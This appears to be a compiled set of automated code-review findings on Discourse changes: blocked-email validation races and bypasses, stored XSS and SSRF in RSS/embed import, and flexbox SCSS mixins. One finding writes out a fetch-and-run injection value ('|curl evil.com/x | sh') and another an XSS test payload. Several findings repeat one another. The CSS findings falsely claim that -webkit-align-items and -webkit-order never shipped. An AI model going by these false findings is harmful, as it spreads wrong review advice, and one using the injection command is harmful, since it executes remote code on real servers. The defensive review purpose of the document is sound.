body: `should_block?` reads the record, increments match_count in memory, and saves it. Two concurrent signup attempts against the same blocked email both load the row (e.g., match_count=5), each compute match_count=6, and each save; the database ends up at 6 instead of 7. The statistic the feature exists to track is silently corrupted under any concurrent load. Replace the in-memory increment with an atomic SQL update, e.g. `BlockedEmail.where(id: record.id).update_all('match_count = match_count + 1, last_match_at = ?', Time.zone.now)`, or `record.increment!(:match_count)` followed by `record.update_column(:last_match_at, Time.zone.now)`. Using `update_all` also avoids re-running BlockedEmail's own validations on every match.

title: match_count and last_match_at are written twice per signup because validation runs twice
body: EmailValidator.validate_each delegates to `BlockedEmail.should_block?`, which mutates the database (match_count, last_match_at). UsersController#create does `user.valid? && ... if user.save ...`, so the full validation suite — including this validator — runs once for the explicit `valid?` call and again when `save` re-runs validations. Each invocation of `should_block?` increments match_count by 1, so a single signup attempt with a blocked email inflates the counter by 2 (and any retry, double-click, or page-refresh multiplies it further). Make the validator purely read-only and push the statistics into an `after_validation` callback on User (gated by `email_changed?`), or detect a single increment via `update_all` and short-circuit the second call with an instance flag. Keeping validators free of side effects is the standard Rails contract.

title: rejectedEmails.contains compares strictly, so the user can bypass with a case change
body: In `emailValidation`, `this.get('rejectedEmails').contains(email)` is a strict equality check. The list is populated from `result.values.email`, which is whatever the server stored (case preserved). If the server previously rejected `Bad@Spam.com`, the user simply retypes `bad@spam.com` and the client-side check passes, even though the backend has the same case-sensitivity bug as `BlockedEmail.should_block?`. Lowercase both the stored and compared values (e.g., store `result.values.email.toLowerCase()` and compare `email.toLowerCase()` against the list) so client-side rejection matches the address the user is currently typing.

title: EmailValidator spec only exercises the BlockedEmail branch; whitelist and blacklist are untested
body: EmailValidator#validate_each has three independent branches (whitelist, blacklist, BlockedEmail) but the spec only stubs `BlockedEmail.should_block?` and asserts on the blocked-email path. There is no test that an email matching `email_domains_whitelist` passes, an email outside the whitelist fails with `user.email.not_allowed`, an email matching `email_domains_blacklist` fails, that the two settings do not interact unexpectedly when both are set, or that a nil/blank value is tolerated. Regressions in any of those branches — including the `elsif` ordering that means a non-empty whitelist silently disables the blacklist — will go undetected.

title: Spec asserts a single increment that production does not produce
body: The shared example `when a BlockedEmail record matches` calls `subject` once (which calls `should_block?` once) and asserts `match_count` changes by exactly 1. In production `should_block?` is invoked from `User#valid?` and again from `User#save`, so the same signup attempt actually increments by 2. The test passes because it bypasses the validator and exercises the model method directly, masking the doubled-write bug. Add a test that mirrors the controller path (build a User with a blocked email, call `valid?` then `save`, and assert the resulting `match_count`) so the inflated-count issue is caught at the spec level.

title: Case-sensitive blocked email lookup allows trivial bypass
body: `BlockedEmail.should_block?` queries with `BlockedEmail.where(email: email).first`, which is case-sensitive in MySQL/Postgres. Users signing up with any uppercase or mixed-case variation of a blocked address (e.g. `BAD@spamclub.com` when `bad@spamclub.com` is blocked) will not match the row and will be allowed to register. The blocker emails are stored verbatim by the migration/model and never normalized, so this completely defeats the anti-spam purpose of the new feature. Normalize on insert and/or on lookup (e.g. `Email.downcase` to match how `users_controller#change_email` already normalizes), or store a separate `email_lower` column and index it.

title: should_block? has a lost-update race on match_count
body: The method does `record = where(email:).first`, then mutates `record.match_count` in memory and calls `record.save`. Two concurrent signup attempts for the same blocked address will both read the same counter, both increment in memory, and both write the same value, so one increment is silently lost and `last_match_at` may flicker between the two competing times. Use an atomic update such as `BlockedEmail.where(id: record.id).update_all(['match_count = match_count + 1, last_match_at = ?', Time.zone.now])` (and avoid loading the row at all when only counting), or wrap in a transaction with row locking.

title: Domain whitelist/blacklist regex matches as substring
body: `Regexp.new("@(#{setting.gsub('.', '\.')})", true)` builds a pattern with no end anchor, so it matches `@example.com` anywhere in the address. With a whitelist of `foo.com`, the address `evil@evilfoo.com` matches because it contains `@foo.com`; with a blacklist of `mail.ru`, `evilmail.ru` style strings may similarly match. This is a pre-existing bug carried over from the old `User#email_in_restriction_setting?` but it is now used by the new validator that gates signup, so it is worth fixing here: anchor with `\z`/`$`, e.g. `Regexp.new("@(#{domains})\z", true)`, and validate the setting format.

title: No test verifies case-insensitive blocking
body: All examples use the same string literal for the blocked record and the queried email. The bypass described in the `blocked_email.rb` finding (typing `BAD@spamclub.com` against a blocked `bad@spamclub.com`) is the most important scenario the new feature is supposed to prevent and it is not covered. Add a context where the queried email differs in case from the stored `blocked_email.email` and assert `should_block?` still returns true (and updates the counter).

title: Query method silently mutates the database
body: `BlockedEmail.should_block?` reads as a predicate (`should_block?`) but has the side effect of incrementing `match_count` and updating `last_match_at` on every call. This runs during every `User` validation, including any path that re-validates a record (e.g. multiple saves, factory builds, or future code paths), and is undocumented. It also means the spec's `should_block?` subject call mutates rows as a side effect of the assertion, which makes failure modes confusing. Splitting the check from the stats update, or at minimum documenting the side effect, would make the contract explicit and prevent future callers from being surprised by extra writes (and by the lost-update behavior described in the concurrency finding).

title: Case-sensitive email lookup lets users bypass the block list
body: BlockedEmail.should_block? queries BlockedEmail.where(email: email).first, which is an exact, case-sensitive string match. Email addresses are case-insensitive per RFC 5321, and the User model stores the email as submitted (no downcasing on assignment), so an admin adding `bad@spamclub.com` to blocked_emails will not stop a user signing up with `Bad@SpamClub.com` or `BAD@SPAMCLUB.COM`. Since the entire point of this feature is to reject known-bad addresses, this is a core-functionality bug: the lookup should normalize (downcase and strip) the email before querying, and ideally the BlockedEmail model's uniqueness validation should be made case-insensitive too so admins don't silently end up with duplicate near-spellings.

title: Validator has the side effect of writing to blocked_emails
body: BlockedEmail.should_block? does `record.match_count += 1; record.last_match_at = Time.zone.now; record.save` every time it finds a matching record. It is called from EmailValidator.validate_each, which fires on every User save with `email_changed?` — including profile updates that change an email and any form re-submission that re-validates. As a result match_count and last_match_at are incremented for each validation attempt rather than each actual signup, the validator is no longer idempotent, and a failed DB write inside should_block? raises out of the validator with no rescue (turning a 'blocked email' check into a 500). Statistics should be updated by a separate, explicit call (e.g. in the controller only when the user actually creates an account), and should_block? itself should be a pure check.

title: Read-modify-write race on match_count
body: should_block? loads the record, increments match_count in Ruby, then calls record.save. Two concurrent requests for the same blocked email can each read match_count = N, both increment to N+1, and both save N+1, losing one update. Use an atomic update such as `BlockedEmail.where(id: record.id).update_all('match_count = match_count + 1, last_match_at = NOW()')` or `update_counters`.

title: Whitelist/blacklist branches of EmailValidator have no tests
body: The whitelist (SiteSetting.email_domains_whitelist) and blacklist (SiteSetting.email_domains_blacklist) branches were moved out of User#email_validator into the new EmailValidator, but the spec only stubs BlockedEmail.should_block?. There is no coverage that an email matching the whitelist passes, that a non-whitelisted email gets the :not_allowed error, that a blacklisted email is rejected, or that an existing whitelist/blacklist error suppresses the blocked-email check. Adding tests for those branches would protect against regressions in the moved logic.

title: Domain-setting regex only escapes dots
body: email_in_restriction_setting? does `setting.gsub('.', '\.')` and feeds the rest directly into Regexp.new. Other regex metacharacters (`*`, `+`, `?`, `|`, `(`, `)`, `[`, `]`, `^`, `$`) in the SiteSetting are interpreted as regex syntax instead of literals, so a value like `mail.ru+` or a multi-domain list with an unexpected separator can match in surprising ways. The legacy code had the same problem, but this is a good opportunity to either escape all regex metacharacters or split the setting on a fixed separator (e.g. `|`) and match each domain literally.

title: Stored XSS: untrusted RSS content stored with raw_html cook_method
body: poll_feed reads `i.content` from the feed, runs only `CGI.unescapeHTML(...scrub)` (which strips invalid bytes but does not sanitize HTML), and passes it straight into `TopicEmbed.import`. import then creates a post with `cook_method: Post.cook_methods[:raw_html]` and, because Post#cook returns `raw` for that mode and best.html.erb renders the post with `<%= raw post.cooked %>`, any `<script>` (or other active) tags in the feed end up executing inside an iframe whose origin is Discourse. The same vector exists for TopicEmbed.import_remote (Readability output is trusted and the raw URL body for Disqus) and the disqus.thor import. Anyone with admin control of feed_polling_url (or embeddable_host, or a Disqus import file) can get script execution in Discourse's origin and read cookies / take actions on behalf of logged-in users visiting the embed iframe. The fix is to never assign raw_html to imported posts from external sources; run them through the normal cook/sanitize pipeline.

title: New cook_method column default of 1 likely marks every existing post as raw_html
body: The migration adds `cook_method integer default 1 not null` to posts. Post.cook_methods is `Enum.new(:regular, :raw_html)` and Post#cook short-circuits to `return raw if cook_method == Post.cook_methods[:raw_html]`. With conventional (0-indexed) Enum implementations `[:regular] == 0` and `[:raw_html] == 1`, so existing rows default to raw_html, which means Post#cook now returns the unprocessed markdown source. The before_save hook does `self.cooked = cook(raw, topic_id: topic_id) unless new_record?`, so the next edit on any existing post will overwrite `cooked` with raw markdown and visibly break rendering across the entire site. The migration default should be whichever value Enum maps to `:regular` (verify the Enum implementation; it is almost certainly 0, not 1).

title: postMessage origin check uses substring match, allowing spoofed origins
body: `if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any event whose origin contains `discourseUrl` as a substring. Anything like `https://attacker.com/?x=https://discourse.host`, or any subdomain/hostname that embeds the literal, passes the check, and the parent's height (or anything else e.data ever carries) can be set by an attacker frame. Because this same message handler also reads any e.data.type, a malicious frame could trigger other branches later. Use `new URL(discourseUrl).origin` (with a trailing slash check) and compare exactly: `new URL(e.origin).origin === expectedOrigin`.

title: embed/best does not validate that embed_url belongs to the embeddable host
body: `embed_url = params.require(:embed_url)` is used directly in `TopicEmbed.topic_id_for_embed(embed_url)` and passed to `Jobs.enqueue(:retrieve_topic, embed_url: embed_url)` without verifying its host equals `SiteSetting.embeddable_host`. The host check happens only asynchronously inside TopicRetriever. Anyone who knows an existing embed_url can render that topic via `/embed/best`, and any caller can enqueue a retrieve for a non-matching URL (it just silently no-ops in the retriever, but still hits the DB, the queue, and reveals embed existence). Validate the host synchronously in the controller before doing the lookup or enqueueing.

title: Imported posts created with skip_validations: true and raw_html can persist arbitrary content with no Sanitize pass
body: When `TopicEmbed.import` creates the initial post it passes `skip_validations: true` along with `cook_method: raw_html`. Combined, the post's `cooked` field stores whatever HTML the caller supplied, including `<script>`, `onerror=`, `<iframe>`, javascript: links, etc., and Post#cook then returns that raw content unmolested. Even though `absolutize_urls` runs on the content, it does not sanitize. Two follow-up problems: (1) the Disqus thor path later creates further reply posts via PostCreator without setting `cook_method`, mixing modes in the same topic; (2) `revisor.revise!(... , skip_validations: true, bypass_rate_limiter: true)` overwrites the post with whatever the next import produces, also bypassed. Sanitize imported HTML before storing it and do not pair `skip_validations` with raw_html.

title: Synchronously executes the scheduled PollFeed job on every retrieve
body: `perform_retrieve` does `Jobs::PollFeed.new.execute({})` inside the retriever job's execution. This pulls and parses the full RSS feed, hits RSS hosts, and writes TopicEmbeds for every item in the feed, all while the retriever itself (triggered by a user GET to /embed/best) is queued behind it. A large feed will make every embed request stall, and it ignores the PollFeed scheduling/throttling guarantees. The retrieve should only try to import the single embed_url, not rerun the whole feed poller inline.

title: postMessage targetOrigin should be origin only, not referer URL
body: The `postMessage` call uses `'<%= request.referer %>'` as the `targetOrigin` argument. `targetOrigin` should be a serialized origin (scheme + host + port) or `*`. Passing the full referer URL works in browsers because they parse the string down to its origin, but the correct and safe value is explicitly the origin. Worse, when `request.referer` is nil/empty (which `ensure_embeddable` allows when there is no Referer header), the rendered value becomes `parent.postMessage(..., '')`. An empty string is treated as `"*"` by browsers, causing the resize message to be sent to any window that has registered a `message` listener — a small but real information leak (the Discourse iframe's pixel height to any opener/parent). Render the referer's origin (e.g. `"#{URI(request.referer || '').scheme}://#{URI(request.referer || '').host}"`) and bail out (or send `null` height) when referer is missing.

title: Kernel#open on user-controlled URL allows command execution
body: `rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` invokes `Kernel#open` on the configured feed URL. Ruby's `Kernel.open` treats a leading `|` as a subshell command, so an admin who pastes or copy-pastes a URL like `|curl evil.com/x | sh` (or `|something`) into `feed_polling_url` will execute it as the Ruby process (which is the Rails/web process — typically the Discourse user, often with access to the DB and `Rails.env` secrets). Later versions of Discourse explicitly replace `Kernel.open` and `OpenURI.open_uri` everywhere this pattern appears for exactly this reason. Use `URI.open(SiteSetting.feed_polling_url)` (OpenURI) or an explicit HTTP client, with a redirect/host allowlist and size/time limits, instead of `Kernel.open`.

title: raw_html cook_method bypasses sanitization, enabling stored XSS
body: In `Post#cook`, when `cook_method == Post.cook_methods[:raw_html]` the method returns `raw` verbatim, skipping `post_analyzer.cook(*args)` which is what normally runs sanitization (whitelisted image classes, host-aware link rewriting, etc.). The `TopicEmbed.import` flow (called from `TopicEmbed.import_remote` → `ruby-readability`, and from `Jobs::PollFeed` over fetched RSS items) creates these posts with `cook_method: Post.cook_methods[:raw_html]` and stores the upstream raw HTML as `raw`. Any HTML/JS present in the trusted-but-compromised source (a hijacked blog post, a malicious RSS entry, etc.) is therefore rendered to every visitor of the embed iframe, and because `best.html.erb` renders with `<%= raw post.cook %>`, nothing in the rendering path will scrub it. This is stored XSS inside the Discourse origin. At minimum, the `raw_html` branch must run the same sanitizer `cook` applies for regular posts (e.g. `PostAnalyzer.new(raw, topic_id).cook`), or, better, the cook_method selector should reject generic HTML and only accept a constrained subset.

title: Script throws if #discourse-comments is not present
body: `var comments = document.getElementById('discourse-comments')` is dereferenced at `comments.appendChild(iframe)` without a null check. If a third-party site embeds the script before the `#discourse-comments` div exists (wrong placement, dynamic page where the div hasn't been rendered yet, etc.), the script crashes on the `null.appendChild(...)` call and the rest of the IIFE — including the `postMessage` listener — never runs, so the embed silently fails and the iframe can never self-resize. Guard the append: `if (comments) { comments.appendChild(iframe); } else { document.body.appendChild(iframe); }`.

title: absolutize_urls corrupts protocol-relative URLs
body: `absolutize_urls` only absolutizes `href`/`src` values that `start_with?('/')`. Protocol-relative URLs like `//cdn.example.com/img.jpg` match that check but then `href.sub(/^\/+/, '')` strips every leading slash, so a value that is supposed to point at `https://cdn.example.com/img.jpg` is rewritten into `https://example.comcdn.example.com/img.jpg`. The link appears to be a same-origin resource, which is both broken (the image fails to load) and a small URL-confusion issue because the rendered URL points at the embed host. Detect protocol-relative inputs explicitly: `a['href'] = href.sub(/^\/+/, '/') if href.start_with?('//')` (keep the leading `//`) and append to `prefix` instead of inserting a literal slash.

title: i.content may be nil and blows up on .scrub
body: `content = CGI.unescapeHTML(i.content.scrub)` assumes `i.content` is non-nil. Not every RSS/Atom item carries a `content` field — some provide only `description` or `summary`, in which case `SimpleRSS#content` returns `nil` and `nil.scrub` raises `NoMethodError`. A single malformed feed entry aborts the entire hourly poll job for the rest of the items in the batch and may surface in error reports. Use `i.content.presence || i.description.to_s` (or wrap in a guard) so missing content yields an empty string instead of an exception.

title: TTL is set only on the racing process; throttle window is effectively unbounded
body: `retrieved_recently?` uses `SETNX` followed by `EXPIRE 60`. Between the `SETNX` and the `EXPIRE`, the key has no TTL — if the process dies in that gap (Sidekiq worker killed, VM paused) the key persists forever with the value `"1"`, and every subsequent attempt to retrieve that same embed URL will be silently throttled indefinitely because `invalid_host?` is the only other gate and the throttle check returns `true` first. Move the TTL into a single atomic call: `$redis.set(retrieved_key, '1', nx: true, ex: 60)` so the key is always created with its expiration. Additionally, the inverse race exists: two workers can both pass `retrieved_recently?` returning false simultaneously before either `SETNX` runs, and both will go on to call `TopicEmbed.import_remote` — the unique index on `topic_embeds.embed_url` is the only thing protecting against the double-import, and `TopicEmbed.import` calls `PostCreator.create` with side effects (notifications, draft sequence, message_bus publish) that aren't rolled back by the unique-index failure. These two issues combined mean the throttle provides at most a 60-second fence, not a deduplication guarantee, despite the name.

title: perform_retrieve runs the entire RSS poll synchronously inside a single embed import
body: `TopicRetriever#perform_retrieve` does `Jobs::PollFeed.new.execute({})` whenever feed polling is enabled. That job imports every item in the entire RSS feed in a single call — fetching and cooking N remote pages even when this retriever only cares about one specific `embed_url`. For a feed with dozens of entries the embedding request stalls for minutes, blocking the Sidekiq worker, and on every cached re-fetch the whole feed is re-iterated. Filter inside `poll_feed` (or split it into two methods, one keyed by URL) so the synchronous embed path only fetches the requested entry.

title: Stale/unrelated require_dependency 'email/sender'
body: `require_dependency 'email/sender'` is added at the top of the RetrieveTopic job but the job does not use the `Email::Sender` class (or anything else from the email stack) anywhere in this file. It appears to be a copy/paste leftover from another job. Keeping it loads the email autoload subtree unnecessarily on every Sidekiq run of this class and confuses readers searching for the dependency chain.

title: cook_method default of 1 makes every existing post render raw markdown
body: The migration adds the column with `default: 1`. Post.cook_methods is defined in app/models/post.rb as `Enum.new(:regular, :raw_html)`, which assigns 0 to :regular and 1 to :raw_html. Post#cook returns raw when `cook_method == Post.cook_methods[:raw_html]`, so every existing post in the database will, after this migration runs, have cooked == raw. The default value should be 0 so legacy posts continue to cook normally; only newly imported RSS/Readability posts (which explicitly set the option in TopicEmbed.import) should be raw_html.

title: Stored XSS via raw_html cook_method and RSS content
body: For posts whose cook_method is :raw_html, Post#cook sets cooked equal to raw. The embed view then renders the post with `<%= raw post.cooked %>`, which outputs the stored content as raw HTML with no escaping. The PollFeed path (app/jobs/scheduled/poll_feed.rb) calls `CGI.unescapeHTML(i.content.scrub)` before passing it into TopicEmbed.import — String#scrub only removes invalid UTF-8 bytes and does NOT strip HTML, so `<script>`, `<iframe>`, etc. from a crafted RSS feed end up stored verbatim and executed in the embed view. The Readability-based import_remote path uses a tag/attribute allow-list, but the RSS path does not. This gives an attacker who can supply a feed (or any party whose source page gets fetched by import_remote without sanitization) a stored XSS that runs in the discourse forum's embed origin.

title: TopicRetriever runs the full PollFeed job synchronously per retrieval
body: `perform_retrieve` invokes `Jobs::PollFeed.new.execute({})` directly. PollFeed is meant to be a Scheduled hourly job that fetches the configured RSS feed and imports all items via TopicEmbed.import. Calling its execute synchronously inside every RetrieveTopic job means each concurrent embed retrieval triggers a full feed fetch + parse + per-item TopicEmbed.import — effectively O(N) feed polls for N concurrent retrievals. Under any non-trivial traffic this hammers the upstream feed and multiplies database writes. The scheduled recurring PollFeed should be left to sidekiq/sidetiq, or TopicRetriever should enqueue PollFeed rather than executing it on the worker thread.

title: PollFeed reused without distributed locking
body: Beyond the synchronous call, even enqueueing PollFeed per retrieval is unsafe because the job body has no distributed lock keyed on the feed URL. With sidekiq concurrency > 1, simultaneous RetrieveTopic jobs would all enqueue PollFeed and they would each import the full feed (TopicEmbed.import is idempotent per embed_url but still does N TopicEmbed.where checks). Use the `feed_key` (declared at the top of poll_feed.rb but never used) as a SETNX-based lock, or rely solely on the scheduled recurrence.

title: NoMethodError when RSS item has nil content or title
body: The body does `content = CGI.unescapeHTML(i.content.scrub)` followed by `TopicEmbed.import(user, url, i.title, content)`. SimpleRSS returns nil for missing fields, and `nil.scrub` raises NoMethodError, which crashes the job (`sidekiq_options retry: false`). A single malformed feed item aborts the entire poll, so no later items are imported either. Guard with `i.content.to_s.scrub` (or a presence check) and skip items whose title/link are blank.

title: Embed iframe is created without a sandbox attribute
body: The iframe has no `sandbox` (or `allow-scripts`/`allow-same-origin` flags), so the embedded page can run JavaScript with full access to its origin: it can navigate the parent, open popups, send form fields, etc. Even though the embed view is intended to be simple, defense in depth requires `iframe.sandbox = 'allow-scripts allow-same-origin'` (or similar) so that a compromised embed view cannot escalate into the embedder site.

title: embed_url is never validated against embeddable_host
body: ensure_embeddable checks that `URI(request.referer).host == SiteSetting.embeddable_host`, but the action then uses the user-supplied `embed_url` parameter to look up `TopicEmbed.topic_id_for_embed(embed_url)` and, when missing, enqueues `RetrieveTopic` for `embed_url`. A caller who can spoof or sit on the embeddable host (any XSS / open redirect there) can query the controller for arbitrary embed URLs and cause RetrieveTopic jobs to fetch arbitrary remote pages reachable to the Discourse server (SSRF). At minimum the controller should reject embed_urls whose host is not embeddable_host; ideally it should compare path/host as well.

title: postMessage targetOrigin uses full request.referer URL
body: `parent.postMessage({...}, '<%= request.referer %>')` passes the entire referer (including path and query) as the targetOrigin. The browser uses only the origin portion of that string, but cross-origin framing and referrer-policy quirks can produce referer values that are unexpected (e.g. `null`, or some proxied form). The right thing is to compute the origin from `request.referer` in the controller (e.g. via URI) and pass only scheme://host[:port]. Also, no fallback exists when referer is blank, in which case targetOrigin is the empty string and postMessage silently fails to deliver — combined with the embed.js listener's permissive origin check this may surprise integrators.

title: No test that imported raw_html content is sanitized against XSS
body: The 'works as expected with a new URL' spec only asserts cooked == raw, which actively cements the unsafe behavior. There is no regression test covering the PollFeed path or import(content containing <script>) that would have caught the stored-XSS issue. Add a fixture whose contents include `<script>alert(1)</script>` and assert the post does not render that script in embed/best.

title: No test for nil/missing RSS fields
body: The spec only checks the gating SiteSettings. There is no test for poll_feed's handling of an RSS item with no `content` or no `title`, which is what causes the NoMethodError. Add a fixture where the SimpleRSS stub returns an item whose content/title is nil and assert the job completes (or at least skips gracefully).

title: `<%- end if %>` is a Ruby syntax error
body: The closing construct is `<%- end if %>`. ERB compiles to Ruby that contains `... end if` at the end of the generated method body. `end` followed by the `if` modifier requires an expression; `end if` with nothing after the `if` (and a `%>` terminator) raises `SyntaxError: unexpected keyword_end`. The view will fail to render whenever it is compiled. Replace with `<%- end %>` (or attach a real condition to the postfix `if`).

title: Invalid CSS property -webkit-align-items in align-items mixin
body: The generated rule `-webkit-align-items: $alignment;` is not a valid CSS property and will be silently ignored by browsers. WebKit/Blink supports the unprefixed `align-items` property directly since Chrome 21 (no transitional `-webkit-align-items` was ever shipped). The 2009 flexbox variant `-webkit-box-align` is already included on the preceding line, so this line is redundant noise that bloats the output and signals the author misunderstood the prefix matrix.

title: Invalid CSS property -ms-align-items in align-items mixin
body: The generated rule `-ms-align-items: $alignment;` is not a valid CSS property. The correct IE10 flexbox prefix is `-ms-flex-align`, which is already emitted on the line above. `-ms-align-items` will be silently ignored by IE10 and IE11, providing no cross-browser benefit while bloating the compiled CSS. This is almost certainly a typo of `-ms-flex-align`.

title: Invalid CSS property -webkit-order in order mixin
body: The generated rule `-webkit-order: $val;` is not a valid CSS property. WebKit/Blink has supported the unprefixed `order` property since the 2012 flexbox spec shipped in Chrome 21; no `-webkit-order` transitional prefix was ever used in production browsers. The 2009-spec prefix `-webkit-box-ordinal-group` is already emitted above. This line is dead weight that ignores the actual prefix set and suggests the author did not verify the prefixed property names.

title: order(2) on .extra-info-wrapper has no effect — parent is not a flex container
body: `@include order(2)` is applied to `.extra-info-wrapper`, but its parent `#topic-title` (defined earlier in the same file) is not a flex container: `.title-wrapper` still uses `float: left; width: 90%;` and there is no `display: flex` (or `@include flexbox()`) on `#topic-title` or any of its ancestors in this stylesheet. The CSS `order` property only takes effect on flex items, so this call is effectively dead code and the intended reordering will not happen. Either the parent selector must be promoted to a flex container (and `.title-wrapper`'s float/width reverted) or the `order(2)` call should be removed.

title: Invalid CSS property -webkit-align-items in align-items mixin
body: The new align-items mixin emits `-webkit-align-items: $alignment;`. WebKit/Blink never shipped this property — they used `-webkit-box-align` for the 2009 spec (already included on line 118) and then went straight to the unprefixed `align-items`. The `-webkit-align-items` declaration is not a recognized CSS property; browsers will discard it silently. It clutters the compiled output and is a clear typo adjacent to the correct `-webkit-box-align` line.

title: Invalid CSS property -ms-align-items in align-items mixin
body: The new align-items mixin emits `-ms-align-items: $alignment;`. The IE 10 prefix for align-items is `-ms-flex-align` (already included on line 120); `-ms-align-items` is not a real CSS property. The redundant invalid declaration is silently ignored by browsers and is a typo. The correct line should be removed.

title: Invalid CSS property -webkit-order in order mixin
body: The new order mixin emits `-webkit-order: $val;`. WebKit/Blink never shipped this property — they used `-webkit-box-ordinal-group` for the 2009 spec (already included on line 126) and then went straight to the unprefixed `order`. `-webkit-order` is not a valid CSS property and is silently ignored. This is a typo adjacent to the correct `-webkit-box-ordinal-group` line.

title: Removed bullet badge vertical alignment without replacement
body: The diff deletes the rule `.extra-info-wrapper .badge-wrapper { float: left; &.bullet { margin-top: 5px; } }` and replaces it with `float: left` only, while also adding `@include order(2)` to the wrapper. The previous `margin-top: 5px` on bullet-style badges was used to vertically align the colored bullet with adjacent baseline-aligned text (a typical alignment fix for inline elements used inside a larger line of text). Nothing in this PR provides an equivalent offset, so bullet-style category badges rendered inside `.extra-info-wrapper` (e.g., on topic lists and the topic page header) may now sit visually lower than the surrounding text. This is a regression with no test or visual reference provided.

title: Large padding reduction on .small-action-desc is untested
body: `.small-action-desc` padding was changed from `0.5em 0 0.5em 4em` (with a matching `margin-top: 5px`) to `padding: 0 1.5%` while `.small-action` is converted to a flex container. The original 4em left padding was sized to clear the `.topic-avatar` icon column in the float-based layout. In the new flex layout the avatar becomes a sibling flex item, but the new `padding: 0 1.5%` collapses the inner `.avatar`'s surrounding space to a tiny percentage with no minimum, and the old `margin-top: 5px` was dropped without a replacement. Combined with the removal of `padding-top: 4px` on `> p`, the description block is likely to render noticeably tighter and/or vertically misaligned versus the avatar column. No screenshot, test, or visual regression coverage accompanies this change.

title: Complete removal of .title rule while relying on flex container
body: The diff deletes the entire `.title { float: left; }` rule and turns `.contents` into a flex container. While removing the float is intentional, the rule is now gone entirely — any other declaration (e.g., `min-width`, `max-width`, `flex` shrink behavior, `white-space`) that downstream consumers might have relied on for the title element is no longer being applied here. In addition, the fallbacks produced by the new `flexbox()` mixin (`-webkit-box`, `-moz-box`) make `.contents` a 2009-spec box container in legacy browsers, where `.title` and `.panel` will not behave like modern flex items; without the removed float, the layout in those legacy engines has no clear-float behavior. The change should at minimum be verified visually in a legacy-WebKit/Firefox fallback.

title: Invalid -ms-align-items vendor prefix in align-items mixin
body: The align-items mixin includes `-ms-align-items: $alignment;` which is not a valid CSS property. The correct IE-prefixed property for align-items is `-ms-flex-align` (which is already present on the previous line). This declaration is silently ignored by all browsers and should be removed.

title: Removed bullet badge margin-top may cause vertical misalignment
body: The `&.bullet { margin-top: 5px; }` rule nested under `.extra-info-wrapper .badge-wrapper` was removed. This 5px top margin was used to vertically align the bullet-style category badge with the surrounding title text in the topic header. Without it, the bullet badge now sits flush at the top of `.extra-info-wrapper` instead of being offset to align with the title baseline, causing a visible vertical misalignment in the rendered topic list.

title: Dead float declarations remain on flex children in .contents
body: Lines 43-44 (`float: left` on `.login-button, button.sign-up-button`) and line 54 (`float: left` on `.icons`) still declare floats on elements whose parent `.contents` is now a flex container. In flex containers, the `float` property on children is computed but ignored, so these declarations are dead code. The same applies to the `button { float: right }` rule at topic-post.scss line 309 and `float: left` on `.topic-avatar` at topic-post.scss line 270, whose parent `.small-action` is also now a flex container. The `clear: both` at the end of `.small-action` likewise has no effect in a flex context. These declarations should be removed to avoid confusion about the actual layout mechanism.
